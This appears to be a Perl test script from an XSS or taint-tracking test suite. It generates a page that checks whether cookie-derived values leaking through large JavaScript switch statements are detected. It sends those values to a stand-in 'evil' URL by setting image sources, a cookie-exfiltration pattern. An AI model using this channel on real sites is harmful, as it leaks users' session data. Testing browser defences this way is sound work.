#!/usr/bin/perl

require "xss_basic_vars.pl";

$title = "Test JSOP_LOOKUPSWITCHX";
$evil = "document.cookie";

require "xss_basic_uses.pl";

require "xss_basic_cookie.pl";

require "xss_basic_header.pl";

require "xss_basic_bodystart.pl";

require "xss_basic_form.pl";

print qq|
    <script type="text/javascript">
    
		var evil = 2;
		if ($evil) {
			evil = "ze";
		}
		var notevil = "z1";
		var notevil2 = "z2";
		var notevil3 = "z3";
		var dut = 7;
		var dut2 = 7;
		var dut3 = 7;

		// shouldn't be evil 
		
		switch ( notevil ) {
			case "z1": dut = 2;
				break;
|;
for ($i = 2; $i < 1800; $i++) {
print qq|			case "z$i":
				notevil = (notevil + $i)/2;
				break;
|;
}
print qq|		
			default:
				 dut = 3;
			break;
		}
		
		var url = "$imgevilurl?normal=" + dut;
		document.images[0].src = url;
		// if with evil val 
		
		if ($evil) {
			switch ( notevil2 ) {
				case "z1": dut2 = 2;
					break;
|;
for ($i = 2; $i < 1800; $i++) {
print qq|			case "z$i":
				notevil = (notevil + $i)/2;
				break;
|;
}
print qq|		
				default:
					 dut2 = 3;
				break;
			}
		}
		
		var url2 = "$imgevilurl?if=" + dut2;
		document.images[1].src = url2;
		
		// normal usage 
		
		switch ( evil ) {
			case "ze": dut3 = 2;
				break;
|;
for ($i = 2; $i < 1800; $i++) {
print qq|			case "ze$i":
				notevil = (notevil + $i)/2;
				break;
|;
}
print qq|		
			default:
				 dut3 = 3;
			break;
		}
		var url3 = "$imgevilurl?isevil=" + dut3;
		document.images[2].src = url3;

    </script>
|;

require "xss_basic_footer.pl";
